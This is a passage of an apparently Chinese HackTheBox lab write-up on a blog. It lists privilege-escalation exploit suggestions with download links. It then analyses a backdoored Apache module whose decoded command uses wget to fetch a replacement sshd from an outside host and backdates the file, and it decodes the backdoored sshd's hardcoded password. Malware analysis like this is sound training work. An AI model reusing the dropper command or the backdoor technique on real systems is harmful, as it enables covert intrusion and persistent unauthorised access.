+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="p">[</span><span class="nc">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">3156</span><span class="p">]</span> <span class="nv">sudo</span> <span class="nc">Baron</span> <span class="nc">Samedit</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nc">Details</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nc">Exposure</span><span class="p">:</span> <span class="nv">probable</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Tags</span><span class="p">:</span> <span class="nv">centos</span><span class="o">=</span><span class="mi">6</span><span class="o">|</span><span class="mi">7</span><span class="o">|</span><span class="mi">8</span><span class="p">,[</span> <span class="nv">ubuntu</span><span class="o">=</span><span class="mi">14</span><span class="o">|</span><span class="mi">16</span><span class="o">|</span><span class="mi">17</span><span class="o">|</span><span class="mi">18</span><span class="o">|</span><span class="mi">19</span><span class="o">|</span><span class="mi">20</span> <span class="p">],</span> <span class="nv">debian</span><span class="o">=</span><span class="mi">9</span><span class="o">|</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Download</span> <span class="nc">URL</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//codeload.github.com/worawit/CVE-2021-3156/zip/main
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="p">[</span><span class="nc">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">22555</span><span class="p">]</span> <span class="nc">Netfilter</span> <span class="nv">heap</span> <span class="nv">out</span><span class="o">-</span><span class="nv">of</span><span class="o">-</span><span class="nv">bounds</span> <span class="nv">write</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nc">Details</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nc">Exposure</span><span class="p">:</span> <span class="nv">probable</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Tags</span><span class="p">:</span> <span class="p">[</span> <span class="nv">ubuntu</span><span class="o">=</span><span class="mf">20.04</span> <span class="p">]{</span><span class="nv">kernel</span><span class="p">:</span><span class="mf">5.8.0</span><span class="o">-*</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Download</span> <span class="nc">URL</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nv">ext</span><span class="o">-</span><span class="nv">url</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nc">Comments</span><span class="p">:</span> <span class="nv">ip_tables</span> <span class="nv">kernel</span> <span class="kn">module</span> <span class="nv">must</span> <span class="nv">be</span> <span class="nv">loaded</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="p">[</span><span class="nc">CVE</span><span class="o">-</span><span class="mi">2017</span><span class="o">-</span><span class="mi">5618</span><span class="p">]</span> <span class="nv">setuid</span> <span class="nv">screen</span> <span class="nv">v4</span><span class="mf">.5.0</span> <span class="nc">LPE</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nc">Details</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//seclists.org/oss-sec/2017/q1/184
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nc">Exposure</span><span class="p">:</span> <span class="nv">less</span> <span class="nv">probable</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Download</span> <span class="nc">URL</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是缺少比如<code>make</code>,<code>cc</code>,<code>cc1</code>等条件,无法编译(手动上传也不行&hellip;)</p>
+<p><code>CVE-2021-3156</code>已经patched</p>
+<p>除了直接提权外,还有邮件可能可以利用</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png" /></p>
+<p><code>/var/mail/steven</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">From root@production  Sun, 25 Jul 2021 10:31:12 GMT
+</span></span><span class="line"><span class="cl">Return-Path: &lt;root@production&gt;
+</span></span><span class="line"><span class="cl">Received: from production (localhost [127.0.0.1])
+</span></span><span class="line"><span class="cl">	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
+</span></span><span class="line"><span class="cl">	for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT
+</span></span><span class="line"><span class="cl">Received: (from root@localhost)
+</span></span><span class="line"><span class="cl">	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
+</span></span><span class="line"><span class="cl">	Sun, 25 Jul 2021 10:31:12 GMT
+</span></span><span class="line"><span class="cl">Date: Sun, 25 Jul 2021 10:31:12 GMT
+</span></span><span class="line"><span class="cl">Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
+</span></span><span class="line"><span class="cl">To: steven@production
+</span></span><span class="line"><span class="cl">From: root@production
+</span></span><span class="line"><span class="cl">Subject: Investigations
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hi Steven.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We recently updated the system but are still experiencing some strange behaviour with the Apache service.
+</span></span><span class="line"><span class="cl">We have temporarily moved the web store and database to another server whilst investigations are underway.
+</span></span><span class="line"><span class="cl">If for any reason you need access to the database or web application code, get in touch with Mark and he
+</span></span><span class="line"><span class="cl">will generate a temporary password for you to authenticate to the temporary server.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Thanks,
+</span></span><span class="line"><span class="cl">sysadmin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对<code>apache2</code>进行了更新&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">steven@production:/tmp$ whereis apache2
+</span></span><span class="line"><span class="cl">apache2: /usr/sbin/apache2 /usr/lib/apache2 /etc/apache2 /usr/share/apache2 /usr/share/man/man8/apache2.8.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">steven@production:/usr/lib/apache2/modules$ pwd
+</span></span><span class="line"><span class="cl">/usr/lib/apache2/modules
+</span></span><span class="line"><span class="cl">steven@production:/usr/lib/apache2/modules$ ls -lrt
+</span></span><span class="line"><span class="cl">total 8772
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls按时间 降序 排列： ls -lt (最常用)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ls按时间 升序 排列：ls -lrt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>mod_reader.so</code>是最后更新的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">hook_post_config</span><span class="p">(</span><span class="n">apr_pool_t_0</span> <span class="o">*</span><span class="n">pconf</span><span class="p">,</span> <span class="n">apr_pool_t_0</span> <span class="o">*</span><span class="n">plog</span><span class="p">,</span> <span class="n">apr_pool_t_0</span> <span class="o">*</span><span class="n">ptemp</span><span class="p">,</span> <span class="n">server_rec_0</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-38h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">pid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64_decode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYm&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;luL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/bin/bash&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-c&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d </code>date +%Y-%m-%d -r /usr/sbin/a2enmod<code> /usr/sbin/sshd</code></p>
+<hr>
+<p>后面对于<code>/usr/sbin/sshd</code>的逆向分析是看wp了,对<code>auth_password</code>进行分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">auth_password</span><span class="p">(</span><span class="n">ssh</span> <span class="o">*</span><span class="n">ssh</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// dl
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Authctxt_0</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">passwd</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// r13
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// er12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// er8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">size_t</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// r8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// er13
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">backdoor</span><span class="p">[</span><span class="mi">31</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-58h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+1Fh] [rbp-39h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-30h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mh">0xD6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">Authctxt_0</span> <span class="o">*</span><span class="p">)</span><span class="n">ssh</span><span class="o">-&gt;</span><span class="n">authctxt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v13</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">backdoor</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA9F4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">pw</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">valid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">backdoor</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xBCF0B5E3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">backdoor</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xB2D6F4A0FDA0B3D6LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">backdoor</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="kr">__m128i</span> <span class="o">*</span><span class="p">)</span><span class="n">backdoor</span> <span class="o">=</span> <span class="n">_mm_load_si128</span><span class="p">((</span><span class="k">const</span> <span class="kr">__m128i</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">xmmword_7DB30</span><span class="p">);</span><span class="c1">//xmmword_7DB30   xmmword 0FDB3D6E7F7BBFDC8A4B3A3F3F0E7ABD6h
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v6</span><span class="o">++</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">^</span> <span class="mh">0x96</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">v12</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终的backdoor为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0xa5
+</span></span><span class="line"><span class="cl">0xa9f4
+</span></span><span class="line"><span class="cl">0xbcf0b5e3
+</span></span><span class="line"><span class="cl">0xb2d6f4a0fda0b3d6
+</span></span><span class="line"><span class="cl">0xfdb3d6e7
+</span></span><span class="line"><span class="cl">0xf7bbfdc8
+</span></span><span class="line"><span class="cl">0xa4b3a3f3
+</span></span><span class="line"><span class="cl">0xf0e7abd6
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>异或之后的结果为<code>@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-paper/" class="prev" rel="prev" title="HackTheBox-Paper"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-Paper</a>
+            <a href="/htb-routerspace/" class="next" rel="next" title="HackTheBox-RouteSpace">HackTheBox-RouteSpace<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
